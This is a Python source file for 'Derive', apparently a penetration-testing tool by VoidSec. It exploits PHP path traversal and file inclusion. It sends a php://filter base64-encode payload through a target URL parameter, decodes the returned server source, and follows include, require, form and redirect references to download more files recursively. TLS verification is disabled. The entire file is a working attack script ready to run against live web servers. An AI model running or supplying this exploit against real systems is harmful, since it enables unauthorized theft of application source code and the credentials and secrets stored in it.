"""
Title: Derive
Author: Paolo Stagno (@Void_Sec) - https://voidsec.com
Version: 1.0
Recursive Batch File Downloader for PHP Path Traversal
"""

import requests
import pyfiglet
import urllib3  # imported in order to suppress SSL warnings in main()
import argparse
import sys
import os
import re
from termcolor import cprint
from urllib.parse import urlparse
import base64


def main():
    parser = argparse.ArgumentParser(prog="derive.py", description="Recursive Batch File Downloader")
    parser.add_argument("-t", "--target", default=None, dest="target", required=True,
                        help="Remote webserver and path traversal location (eg. http://<IP/hostname>/test.php?a=)")
    parser.add_argument("-f", "--file", default=None, dest="file", required=True,
                        help="File to download (eg. /index.php)")
    parser.add_argument("--cookies", dest="cookies", default=None, help="HTTP Cookies")
    parser.add_argument('--proxy', dest="proxy", default=None,
                        help="IP of web proxy to go through (http://127.0.0.1:8080)")
    parser.add_argument('-v', "--verbose", dest="verbose", default=False, action="store_true",
                        help="Print verbose output")
    args = parser.parse_args()
    banner = pyfiglet.figlet_format("Derive", "doom")
    cprint(banner + "\t\tby Voidsec\n", "green")
    if args.proxy is not None:
        cprint("Proxy ENABLED: {}".format(args.proxy), "yellow")
        proxy = {"http": args.proxy, "https": args.proxy}
    else:
        proxy = {}
    cwd = os.getcwd()
    target_dir = "{}/downloads/{}/".format(cwd, urlparse(args.target).netloc)
    os.makedirs(target_dir)
    cprint("Target: {}".format(urlparse(args.target).netloc), "blue")
    file_list = [args.file]
    cprint("\nDownloading:\n--------------------------", "magenta")
    download_file(args.target, file_list, args.cookies, proxy, target_dir, args.verbose)
    # cleanup
    os.system("find {} -type d -empty -delete".format(cwd))
    sys.exit(0)


def download_file(target, file_list, cookies, proxy, target_dir, verbose):
    """
    Recursive function to download files
    :param target:  target url
    :param file_list:   list of files to download
    :param cookies: http cookies
    :param proxy:   proxy
    :param target_dir:  target directory to write file
    :param quiet:   True will suppress b64 output
    :return:
    """
    while len(file_list) > 0:
        curr_file = file_list.pop()
        # should be enough to fix path traversal
        curr_dir = os.path.realpath(target_dir + "{}".format(curr_file))
        if os.path.exists(curr_dir + ".txt") is True:
            break
        else:
            # will bypass unlink function if present after the readfile
            payload = target + "php://filter/convert.base64-encode/resource={}".format(curr_file)
            cprint("- {}".format(curr_file), "cyan")
            result = query(payload, cookies, proxy)
            os.makedirs(curr_dir)
            w_file = open(curr_dir + ".txt", "a")
            # b64 regex
            pattern = re.compile(
                r"^(?:[a-zA-Z0-9+\/]{4})*(?:|(?:[a-zA-Z0-9+\/]{3}=)|(?:[a-zA-Z0-9+\/]{2}==)|(?:[a-zA-Z0-9+\/]{1}===))$")
            if verbose is True:
                cprint(result.text, "green")
            match = re.findall(pattern, result.text)
            for a in match:
                match_decoded = base64.b64decode(a).decode()
                # TODO: fix this regex, will miss thing like form action="<?php"
                f_pattern = re.compile(
                    r"require[\s_(].*?[\'\"](.*?)[\'\"]|"
                    r"include.*?[\'\"](.*?)[\'\"]|load\([\'\"](.*?)[\'\"?]|"
                    r"form.*?action=[\'\"](.*?)[\'\"?]|"
                    r"header\([\'\"]Location:\s(.*?)[\'\"?]|"
                    r"url:\s[\'\"](.*?)[\'\"?]|"
                    r"window\.open\([\'\"](.*?)[\'\"?]|"
                    r"window\.location=[\'\"](.*?)[\'\"?]", re.IGNORECASE)
                new_file = re.findall(f_pattern, match_decoded)
                for b in new_file:
                    # must cycle items in b since it's tuple
                    for c in b:
                        if c != "" and c != "<":
                            # if file does not start with ./ or ../ or .\ or ..\ while the current one does
                            # use current file dir and append to next file to download
                            if (curr_file[:2] != "./" or curr_file[:2] != ".\\" or curr_file[:3] != "../" or curr_file[
                                                                                                             :3] != "..\\") and (
                                    c[:2] != "./" or c[:2] != ".\\" or c[:3] != "../" or c[:3] != "..\\"):
                                c_file_dir = os.path.dirname(curr_file)
                                if c_file_dir[:1] == "/" or c_file_dir[:1] == "\\" or c_file_dir == "":
                                    file_list.append(c)
                                else:
                                    file_list.append(c_file_dir + "/" + c)
                            else:
                                file_list.append(c)
                w_file.write(match_decoded)
            w_file.close()
            file_list = list(dict.fromkeys(file_list))
            download_file(target, file_list, cookies, proxy, target_dir, verbose)


def query(target, cookies, proxy):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"
    }
    if cookies:
        headers["Cookie"] = cookies
    try:
        request = requests.get(target, headers=headers, proxies=proxy, verify=False)
        if request.status_code == 200:
            return request
        else:
            cprint("Request failed! Code {}".format(request.status_code), "red")
            sys.exit(1)
    except requests.exceptions.MissingSchema:
        cprint("Missing http:// or https:// schema from Target URL", "red")
        sys.exit(1)
    except requests.exceptions.ConnectionError:
        cprint("Failed to establish a new connection: Connection refused", "red")
        sys.exit(1)


if __name__ == "__main__":
    try:
        # Suppress SSL Warning due to unverified HTTPS requests.
        # See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        main()
    except KeyboardInterrupt:
        # Catch CTRL+C, it will abruptly kill the script
        cprint("CTRL+C, exiting...", "red")
        sys.exit(1)
